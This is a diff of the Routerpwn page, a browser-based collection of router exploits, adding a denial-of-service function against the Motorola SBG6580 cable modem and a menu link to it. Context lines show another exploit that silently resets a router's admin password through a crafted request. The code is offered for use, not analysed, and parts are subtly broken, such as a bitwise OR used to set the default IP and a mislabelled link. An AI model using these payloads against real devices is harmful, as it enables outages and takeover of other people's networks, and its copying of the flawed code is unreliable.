@@ -1,7 +1,7 @@
 <!DOCTYPE html>
 <html>
 	<head>
-		<title>Routerpwn 1.20.235</title>
+		<title>Routerpwn 1.20.236</title>
 		<link rel="apple-touch-icon" HREF="favicon.png" />
 		<link rel="shortcut icon" HREF="favicon.ico" />
 		<meta name="apple-mobile-web-app-capable" content="yes" />
@@ -1421,6 +1421,17 @@ function motpas(){
 	alert("Continue...");
 	img2.src="http://192.168.0.1/goformFOO/AlFrame?Gateway.BasicAdminSetting.userId=admin&Gateway.BasicAdminSetting.oldPassword="+ip+"&Gateway.BasicAdminSetting.newPassword="+ip+"&Gateway.BasicAdminSetting.verifyPassword="+ip+"&Gateway.BasicAdminSetting.set=1";
 }
+
+// Motorola SBG6580 Cable Modem & Wireless-N Router Denial of Service
+function SBG6580_motorola(ip)
+{
+	ip = "192.168.0.1" | ip;
+    form = '<input type="hidden" name="this_was" value="too_easy"/>\
+			</form>';
+	post('http://' + ip + '/goform/login', form);
+}
+
+
 function ruggedcom(){
 // JC CREW April 23 2012 \n";
 // .js by hkm
@@ -3764,7 +3775,15 @@ function belkinwpspin()
 <img src="" name="img1" style="visibility:hidden" alt="">
 <img src="" name="img2" style="visibility:hidden" alt="">
 <h2>Motorola</h2>
-<h3><a href="javascript:img('SBG900')">SBG900</a></h3>
+<h3><a href="javascript:img('SBG900')">SBG900</a>, <a href="javascript:img('SBG6580')">SBG900</a></h3>
+
+<article>
+	<div>01/03/14</div>
+	<div><a href="http://1337day.com/exploit/21823">[+]</a></div>
+	<div><a href="javascript:SBG6580_motorola()">Motorola SBG6580 Cable Modem &amp; Wireless-N Router Denial of Service</a></div>
+	<div><a href="javascript:SBG6580_motorola()">[SET IP]</a></div>
+</article>
+	
 	
 <article>
 	<div>07/22/11</div>
